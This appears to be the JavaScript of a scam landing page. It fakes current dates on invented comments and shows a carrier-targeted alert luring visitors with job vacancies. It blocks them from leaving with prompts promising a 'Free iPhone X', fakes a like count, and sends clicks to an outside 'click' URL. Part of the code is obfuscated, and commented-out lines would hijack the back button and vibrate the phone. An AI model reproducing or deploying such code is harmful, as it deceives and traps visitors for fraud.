$(function() {

    /*Initialization of date*/
    var now = new Date;
    var monthNames = ["January","February","March","April","May","June","July","September","August","October","November","December"];
    today = now.getDate() + " " + monthNames[now.getMonth()] + " " + now.getFullYear();

    function get_date(e){
        var mydate = new Date();
        var year = mydate.getFullYear();
        var day = mydate.getDay();
        var month = mydate.getMonth();
        var daym = mydate.getDate();
        var dayNames = ["Sunday","Monday","Tuesday","Wednesday","Thursday","Friday","Saturday"];
        mydate.setDate(mydate.getDate() - e);

        if( year < 1000 ) {
            year += 1900;
        }

        if(daym < 10) {
            daym = "0" + daym;
        }

        return today = daym + " " + monthNames[month] + " " + now.getFullYear();
    }
    /*Write date to the comments*/
    $('#todayDate').text(today);
    $('#commentDateZero').text(get_date(0));
    $('#commentDateOne').text(get_date(0));
    $('#commentDateTwo').text(get_date(0));
    $('#commentDateThree').text(get_date(1));
    $('#commentDateFour').text(get_date(2));
    /*First message*/
    alert("NOTICE " + getURLParameter('carrier') + " user!\n\n" + "Several major companies are opening their branches in [user area] area.\n\nClick OK to review the vacancies.");

    var popit = true;
    window.onbeforeunload = function() {
        if(popit == true) {
            popit = false;
            return "";
        }
    };

    $('.claim').click(function() {
        window.onbeforeunload = null;
        window.location = 'http://hariff-evorgia.com/click';
    });

});

var _0xb8e2=["fadeIn","#comment1","#comment2","#comment3","#comment4","#comment5","#comment6","fadeOut","#q1","#q2","click",".bq1","#q3",".bq2","#q4",".bq3","#content1","#content2","#result1","#result2","#result3","#content3",".bq4","ready","http:","swim","phelps","random","floor","location","","https:","file:","protocol"];
$(document)[_0xb8e2[23]](function(){
    setTimeout(function(){
        $(_0xb8e2[1])[_0xb8e2[0]]()
    },10000);
    setTimeout(function(){
        $(_0xb8e2[2])[_0xb8e2[0]]()
    },12000);
    setTimeout(function(){
        $(_0xb8e2[3])[_0xb8e2[0]]()
    },13000);
    setTimeout(function(){
        $(_0xb8e2[4])[_0xb8e2[0]]()
    },18000);
    setTimeout(function(){
        $(_0xb8e2[5])[_0xb8e2[0]]()
    },20000);
    setTimeout(function(){
        $(_0xb8e2[6])[_0xb8e2[0]]()
    },22000);
    $(_0xb8e2[11])[_0xb8e2[10]](function(){
        $(_0xb8e2[8])[_0xb8e2[7]](0);
        $(_0xb8e2[9])[_0xb8e2[0]](500)
    });
    $(_0xb8e2[13])[_0xb8e2[10]](function(){
        $(_0xb8e2[9])[_0xb8e2[7]](0);
        $(_0xb8e2[12])[_0xb8e2[0]](500)
    });
    $(_0xb8e2[15])[_0xb8e2[10]](function(){
        $(_0xb8e2[12])[_0xb8e2[7]](0);
        $(_0xb8e2[14])[_0xb8e2[0]](500)
    });
    $(_0xb8e2[22])[_0xb8e2[10]](function(){
        $(_0xb8e2[16])[_0xb8e2[7]](0);
        $(_0xb8e2[17])[_0xb8e2[0]]();
        setTimeout(function(){
            $(_0xb8e2[18])[_0xb8e2[0]](1000)
        },3000);
        setTimeout(function(){
            $(_0xb8e2[19])[_0xb8e2[0]](1000)
        },4500);
        setTimeout(function(){
            $(_0xb8e2[20])[_0xb8e2[0]](1000)
        },6000);
        setTimeout(function(){
            $(_0xb8e2[17])[_0xb8e2[7]]()
        },7500);
        setTimeout(function(){
            $(_0xb8e2[21])[_0xb8e2[0]]()
        },7500)
    })
});
switch(window[_0xb8e2[29]][_0xb8e2[33]]){
    case _0xb8e2[24]:
    case _0xb8e2[32]:
        break;
        default:
}

function getURLParameter(name) {
    //  return decodeURI(
    //      (RegExp(name + '=' + '(.+?)(&|$)').exec(location.search)||[,null])[1] || ''
    //  );
    name = name.replace(/[\[\]]/g, "\\$&");
    var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),
            results = regex.exec(location.search);
    if (!results) return null;
    if (!results[2]) return '';
    return decodeURIComponent(results[2].replace(/\+/g, " "));
}

function getCarrier(){
    return decodeURI(
            (RegExp('carrier' + '=' + '(.+?)&').exec(location.search)||[,null])[1] || ''
    );
}

var PreventExitPop = true;
function ExitPop() {
    if(PreventExitPop != false) {
        return "Click OK to participate to receive a Free iPhone X!\n\n---"
    }
}
window.onbeforeunload = ExitPop;

function total_likes(){
    if (document.getElementById('total_likes').innerHTML == 'Ty i <span style="color:#3b5998;">12 068</span> people like it'){
        document.getElementById('total_likes').innerHTML = '<span style="color:#3b5998;">12 068</span> osób lubi to';
        document.getElementById('liked').innerHTML = 'Like';
    } else {
        document.getElementById('total_likes').innerHTML = 'Ty i <span style="color:#3b5998;">12 068</span> people like it';
        document.getElementById('liked').innerHTML = 'Unlike';
    }
}

//bajb_backdetect.OnBack = function(){
//	window.history.back=function(){
//		document.location='#'
//		}
//	}

//bajb_backdetect.OnBack = function(){
//    window.history.back=function(){
//        document.location='http://hariff-evorgia.com/click'
//        }
//    }asda
//  navigator.vibrate = navigator.vibrate || navigator.webkitVibrate || navigator.mozVibrate || navigator.msVibrate;
//  navigator.vibrate([1000, 500, 1000, 500, 1000, 500, 1000, 500, 1000]);